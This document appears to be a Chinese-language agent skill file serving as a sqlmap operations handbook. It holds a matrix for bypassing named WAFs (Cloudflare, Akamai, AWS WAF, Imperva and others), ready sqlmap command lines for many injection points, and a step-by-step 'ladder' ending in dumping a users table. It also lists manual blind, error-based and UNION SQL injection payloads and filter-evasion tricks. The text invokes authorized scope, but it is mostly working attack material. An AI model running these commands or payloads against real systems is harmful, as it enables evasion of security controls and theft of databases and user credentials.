---
name: 吞库针
description: >-
 sqlmap 选项手册与 tamper 著译：按 WAF 推荐 tamper、拼 cmdline、查 --hpp/--cookie/-p 等专题。
 
 签名墙优先 waf_sqli_bypass（Unicode/%0a），再挂本工具推荐的 tamper。
---

# sqlmap / Tamper 知识库

## 真源

1. `炼蛊房/sqlmap_kit.py`
2. `传承/吞库针.md`
3. xlsx：（开源包不收个案摘记） · `sqlmap-tamper著译.xlsx`
4. JSON：`炼蛊房/sqlmap_kit_data/`

## 强制顺序

1. Host 在 scope。 
2. `waf_detect`（可选）→ **`waf_sqli_bypass` 探针**（被拦时优先）。 
3. `sqlmap_kit recommend --waf …` / `cmdline … --case`。 
 4. 授权内按 `ladder` 跑：probe → `--dbs` → `--tables` → `--columns` → `--dump`。百万级拖号先问。

```bash
python3 炼蛊房/sqlmap_kit.py recommend --waf cloudflare
python3 炼蛊房/sqlmap_kit.py cmdline --url 'https://授权/?id=1' -p id --preset unicode_newline --case <案卷>
python3 炼蛊房/sqlmap_kit.py ladder --url 'https://授权/?id=1' -p id --case <案卷>
```

---

## WAF → Tamper 快速决策矩阵

| WAF | 首选 tamper 组合 | 说明 |
|---|---|---|
| **Cloudflare** | `space2comment,charencode,randomcase` | 大小写+注释混淆；若仍拦加 `between` |
| **ModSecurity / OWASP CRS** | `space2comment,charencode,equaltolike` | 等号→LIKE、注释替空格 |
| **宝塔 / SafeDog** | `space2morehash,charunicodeencode` | Unicode全编码过宝塔规则 |
| **Nginx-WAF / OpenWAF** | `randomcomments,between,space2comment` | 随机注释打乱正则 |
| **D盾 / 云锁** | `charunicodeescape,hex2char` | 十六进制字符绕过字符串匹配 |
| **Akamai** | `charencode,randomcase,space2randomblank` | 随机空白字符+随机大小写 |
| **AWS WAF** | `greatest,ifnull2ifisnull,space2comment` | 函数别名迷惑规则 |
| **Imperva (Incapsula)** | `versionedmorekeywords,htmlencode` | MySQL版本注释+HTML实体编码 |
| **360WAF / 安全狗** | `charunicodeescape,between,modsecurityversioned` | 联合使用版本注释 |

## 常用 Tamper 速查

```
space2comment : 空格 → /**/
charencode : URL编码一次 %XX
charunicodeencode : Unicode编码 %u00XX
charunicodeescape : \uXXXX 形式
randomcase : 关键字随机大小写 SeLeCt
between : > → NOT BETWEEN 0 AND
equaltolike : = → LIKE
greatest : > → GREATEST(a,b)=a
hex2char : 字符串 → CHAR(0x..) / HEX
space2randomblank : 空格 → 随机空白(\t\n\r)
space2morehash : 空格 → #randomstring\n
modsecurityversioned : SELECT → /*!SELECT*/
versionedmorekeywords: 关键字加版本注释
randomcomments : 随机插入 /**/ 到关键字内
htmlencode : HTML 实体编码 &lt; &amp;
ifnull2ifisnull : IFNULL(A,B) → IF(ISNULL(A),B,A)
```

## 常用 sqlmap 调参速查

```bash
# 基础探测（不 dump，只确认是否注入）
sqlmap -u "https://授权站/search?q=1" --batch --level=3 --risk=2 \
 --tamper=space2comment,charencode --random-agent --delay=1

# POST 表单注入
sqlmap -u "https://授权站/login" --data="user=test&pass=123" \
 -p user --tamper=space2comment,randomcase --level=5 --risk=3

# Cookie 注入
sqlmap -u "https://授权站/" --cookie="session=abc123*" -p session \
 --tamper=charunicodeencode --dbms=mysql

# JSON 请求体注入
sqlmap -u "https://授权站/api/search" \
 --data='{"keyword":"test*"}' --content-type="application/json" \
 --tamper=charencode

# 延时盲注（更稳，不依赖回显）
sqlmap -u "https://授权站/api/item?id=1" --technique=T \
 --tamper=space2comment --time-sec=5 --delay=2

# 确认注入后拖库（授权内直接做；百万拖号先问）
sqlmap -u "https://授权站/api?id=1*" --dbs
sqlmap -u "https://授权站/api?id=1*" -D mydb --tables
sqlmap -u "https://授权站/api?id=1*" -D mydb -T users --columns
sqlmap -u "https://授权站/api?id=1*" -D mydb -T users --dump --exclude-sysdbs

# 绕过限速（CF/CDN节流）
sqlmap -u "..." --delay=3 --timeout=30 --retries=3 --safe-url=https://授权站 --safe-freq=5
```

## Blind SQLi 手动 payload 模板

```sql
-- 时间盲注（MySQL）确认
1 AND SLEEP(5)-- -- 基础
1' AND SLEEP(5)-- -- 单引号闭合
1) AND SLEEP(5)-- -- 括号闭合
1/**/AND/**/SLEEP(5)-- -- 注释绕空格

-- 布尔盲注（判断表名首字母）
1 AND SUBSTRING((SELECT table_name FROM information_schema.tables
 WHERE table_schema=database() LIMIT 0,1),1,1)='u'--

-- 报错注入（MySQL extractvalue）
1 AND extractvalue(1,concat(0x7e,(SELECT version())))--
1 AND updatexml(1,concat(0x7e,(SELECT database())),1)--

-- UNION 注入（先探列数）
1 ORDER BY 5-- -- 逐步增大到报错，确定列数
1 UNION SELECT NULL,NULL,NULL,NULL,NULL-- -- 找字符串列
1 UNION SELECT 1,database(),user(),version(),5--
```

## 常见绕过手法（手动）

```
# 双写关键字（过滤 SELECT 时）
SElSELECTECT * FROM ...

# 大小写混合（过滤小写正则）
SElEcT * FrOm ...

# 内联注释（MySQL版本注释）
/*!50000SELECT*/ * /*!FROM*/ users--

# 编码绕过
%53%45%4C%45%43%54 (URL编码 SELECT)
\u0053\u0045\u004C\u0045\u0043\u0054 (Unicode)

# 等价函数替换
MID() = SUBSTRING() = SUBSTR()
ASCII() = ORD()
IF(cond,a,b) = CASE WHEN cond THEN a ELSE b END
```
